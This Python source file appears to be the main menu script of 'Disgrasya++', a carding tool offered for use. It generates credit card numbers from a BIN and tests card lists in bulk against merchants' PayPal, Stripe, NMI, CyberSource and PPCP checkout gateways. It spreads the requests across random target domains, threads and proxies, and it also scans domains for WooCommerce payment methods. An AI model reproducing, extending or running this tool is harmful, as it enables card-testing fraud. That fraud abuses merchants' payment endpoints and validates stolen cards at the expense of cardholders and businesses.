import os
import shutil
import platform
import random
from concurrent.futures import ThreadPoolExecutor
from disgrasya.generate import generate_cards
from disgrasya.WoocommercePaymentMethod import WoocommerceCheck
from disgrasya.ccn.ppcp import ppcp_api
from disgrasya.cvv.nmi import nmi_api
from disgrasya.cvv.paypalpro import paypalpro_api
from disgrasya.cvv.paypal_pro_payflow import paypal_pro_payflow_api
from disgrasya.cvv.stripe_cc import stripe_cc_api
from disgrasya.cvv.cybersource import cybersource_api
from disgrasya.testing.lookup import lookup_api

def clear_screen():
    operating_system = platform.system()
    if operating_system == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

def display_logo():
    R = "\033[0m"
    fade_colors = [
        "\033[38;5;81m",
        "\033[38;5;75m",
        "\033[38;5;69m",
        "\033[38;5;63m",
        "\033[38;5;57m",
    ]

    logo_template = f"""
{{0}}██████╗ ██╗███████╗ ██████╗ ██████╗  █████╗ ███████╗██╗   ██╗ █████╗ 
{{1}}██╔══██╗██║██╔════╝██╔════╝ ██╔══██╗██╔══██╗██╔════╝╚██╗ ██╔╝██╔══██╗
{{2}}██║  ██║██║███████╗██║  ███╗██████╔╝███████║███████╗ ╚████╔╝ ███████║
{{3}}██║  ██║██║╚════██║██║   ██║██╔══██╗██╔══██║╚════██║  ╚██╔╝  ██╔══██║
{{4}}██████╔╝██║███████║╚██████╔╝██║  ██║██║  ██║███████║   ██║   ██║  ██║
{{4}}╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝

{R}

{{3}}Note{R}: Serving you quality tools since 2023
{{3}}Module{R}: Disgrasya++
{{3}}Author{R}: Jaehwan0
{{3}}Version{R}: 8.39.9
"""
    
    logo_lines = logo_template.format(*fade_colors).splitlines()
    width = shutil.get_terminal_size().columns
    centered_logo = "\n".join(line.center(width) for line in logo_lines if line)
    print(centered_logo)

def parse_proxy(proxy_string):
    Y = "\033[38;5;226m"
    if proxy_string:
        try:
            host, port, user, password = proxy_string.split(':')
            return {
                'http': f'http://{user}:{password}@{host}:{port}',
                'https': f'http://{user}:{password}@{host}:{port}',
            }
        except ValueError:
            print(f"[{Y}!{Y}] Invalid proxy format. Use Host:port:user:pass.")
            return None
    return None

def main():
    clear_screen()
    display_logo()
    print()
    V = "\033[38;5;57m"
    Y = "\033[38;5;226m"
    R = "\033[0m"
    print(f"[{V}1{R}] Generate Credit Card")
    print(f"[{V}2{R}] Check Credit Card")
    print(f"[{V}3{R}] Check Woocommerce Payment Method")
    print()
    choice = input(f"[{V}>{R}] Enter your choice: ").strip()

    try:
        if choice == '1':
            gen_input = input(f"[{V}>{R}] Enter bin: ").strip().split()
            bin_code = gen_input[0]
            count = int(gen_input[-1])
            
            if len(gen_input) == 2:
                month = "random"
                year = "random"
            else:
                month = gen_input[1]
                year = gen_input[2]
                
            generate_cards(bin_code, month, year, count)
        
        elif choice == '2':
            clear_screen()
            display_logo()
            print(f"[{V}1{R}] Cvv Gateway")
            print(f"[{V}2{R}] Cnn Gateway")
            print(f"[{V}3{R}] Testing Gateway")
            print()
            gateway_choice = input(f"[{V}>{R}] Enter your gateway choice: ").strip()

            if gateway_choice == "1":
                clear_screen()
                display_logo()
                print(f"[{V}1{R}] paypalpro")
                print(f"[{V}2{R}] paypal_pro_payflow")
                print(f"[{V}3{R}] stripe_cc")
                print(f"[{V}4{R}] nmi")
                print(f"[{V}4{R}] cybersource")
                print()
                api_choice = input(f"[{V}>{R}] Enter your choice: ").strip()
                if api_choice == "1":
                    api_type = "paypalpro"
                elif api_choice == "2":
                    api_type = "paypal_pro_payflow"
                elif api_choice == "3":
                    api_type = "stripe_cc"
                elif api_choice == "4":
                    api_type = "nmi"
                elif api_choice == "5":
                    api_type = "cybersource"
                else:
                    return print(f"[{Y}!{R}] Invalid API choice.")
            
            elif gateway_choice == "2":
                clear_screen()
                display_logo()
                print(f"[{V}1{R}] ppcp")
                print()
                api_choice = input(f"[{V}>{R}] Enter your choice: ").strip()
                if api_choice == "1":
                    api_type = "ppcp"
                else:
                    return print(f"[{Y}!{R}] Invalid API choice.")
            
            elif gateway_choice == "3":
                clear_screen()
                display_logo()
                print(f"[{V}1{R}] lookup (unfinished)")
                print()
                api_choice = input(f"[{V}>{R}] Enter your choice: ").strip()
                if api_choice == "1":
                    api_type = "lookup"
                else:
                    return print(f"[{Y}!{R}] Invalid API choice.")
            else:
                return print(f"[{Y}!{R}] Invalid gateway choice.")

            domain_file = input(f"[{V}>{R}] Enter the path to the domain text file: ").strip()
            try:
                with open(domain_file, "r") as file:
                    domains = [line.strip() for line in file if line.strip()]
                if not domains:
                    raise ValueError("The domain file is empty.")
            except Exception as e:
                return print(f"[{Y}!{R}] Error reading domain file: {e}")

            creditcard_file = input(f"[{V}>{R}] Enter the path to the credit card text file: ").strip()
            threads = int(input(f"[{V}>{R}] Enter the number of threads: ").strip())
            proxy = input(f"[{V}>{R}] Optional: Enter proxy (leave blank if not used): ").strip() or None
            print()

            proxy_info = parse_proxy(proxy)

            try:
                with open(creditcard_file, "r") as file:
                    creditCards = file.readlines()
            except Exception as e:
                return print(f"Error reading credit card file: {e}")

            with ThreadPoolExecutor(max_workers=threads) as executor:
                for creditCard in creditCards:
                    random_domain = random.choice(domains)
                    if api_type == 'ppcp':
                        executor.submit(ppcp_api, random_domain, creditCard.strip(), proxy_info)
                    elif api_type == 'nmi':
                        executor.submit(nmi_api, random_domain, creditCard.strip(), proxy_info)
                    elif api_type == 'paypalpro':
                        executor.submit(paypalpro_api, random_domain, creditCard.strip(), proxy_info)
                    elif api_type == 'paypal_pro_payflow':
                        executor.submit(paypal_pro_payflow_api, random_domain, creditCard.strip(), proxy_info)
                    elif api_type == 'stripe_cc':
                        executor.submit(stripe_cc_api, random_domain, creditCard.strip(), proxy_info)
                    elif api_type == 'lookup':
                        executor.submit(lookup_api, random_domain, creditCard.strip(), proxy_info)
                    elif api_type == 'cybersource':
                        executor.submit(cybersource_api, random_domain, creditCard.strip(), proxy_info)
        elif choice == '3':
            clear_screen()
            display_logo()
            print()
            domain_file = input(f"[{V}>{R}] Enter the path to the domain text file: ").strip()
            threads = int(input(f"[{V}>{R}] Enter the number of threads: ").strip())
            print()
            try:
                with open(domain_file, "r") as file:
                    domains = file.readlines()
            except Exception as e:
                return print(f"Error reading domain file: {e}")
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for domain in domains:
                    executor.submit(WoocommerceCheck, domain.strip())

        else:
            return print(f"[{Y}!{R}] Invalid choice. Please select either 1, 2 or 3.")
    
    except Exception as e:
        return print(f"[{Y}!{R}] An error occurred during processing: {e}")

if __name__ == "__main__":
    main()